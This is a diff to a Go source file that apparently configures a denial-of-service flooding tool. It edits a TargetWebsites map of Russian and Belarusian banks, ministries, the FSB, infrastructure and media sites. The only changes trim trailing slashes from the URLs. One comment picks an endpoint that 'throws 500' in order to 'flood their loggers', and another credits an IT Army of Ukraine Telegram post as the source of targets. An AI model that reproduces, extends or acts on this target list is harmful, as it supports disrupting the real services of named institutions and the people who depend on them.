@@ -117,7 +117,7 @@ var TargetWebsites = map[string]struct{}{
 	"https://www.gazprombank.ru":                                     {},
 	"https://api.gazprombank.ru":                                     {},
 	"https://www.moex.com":                                           {},
-	"https://iss.moex.com/iss/reference/":                            {},
+	"https://iss.moex.com/iss/reference":                             {},
 	"https://messaging.moex.com/init":                                {},
 	"https://passport.moex.com/login":                                {},
 	"http://www.fsb.ru":                                              {},
@@ -138,7 +138,7 @@ var TargetWebsites = map[string]struct{}{
 	"https://online.sberbank.ru/CSAFront/index.do":                   {},
 	"https://online.gpb.ru/login":                                    {},
 	"https://alfabank.ru":                                            {},
-	"https://alfabank.ru/api/v1/geco-ip/":                            {}, // throws 500. flood their loggers
+	"https://alfabank.ru/api/v1/geco-ip":                             {}, // throws 500. flood their loggers
 	"https://rshb.ru":                                                {},
 	"https://online.rshb.ru/b1/ib6/wf2/retail/ib/loginretaildefault": {},
 	"https://online.sovcombank.ru":                                   {},
@@ -416,7 +416,7 @@ var TargetWebsites = map[string]struct{}{
 	"http://www.bellegprom.by":    {},
 	"https://www.energo.by":       {},
 	"http://belres.by/ru":         {},
-	"https://www.rw.by/":          {},
+	"https://www.rw.by":           {},
 
 	// by media
 	"https://belta.by":            {},
@@ -514,7 +514,7 @@ var TargetWebsites = map[string]struct{}{
 	// https://t.me/itarmyofukraine2022/248
 	"https://digital.gov.ru":      {},
 	"https://minenergo.gov.ru":    {},
-	"https://minfin.gov.ru/ru/":   {},
+	"https://minfin.gov.ru/ru":    {},
 	"https://minjust.gov.ru":      {},
 	"https://www.minsport.gov.ru": {},
 	"https://minstroyrf.gov.ru":   {},
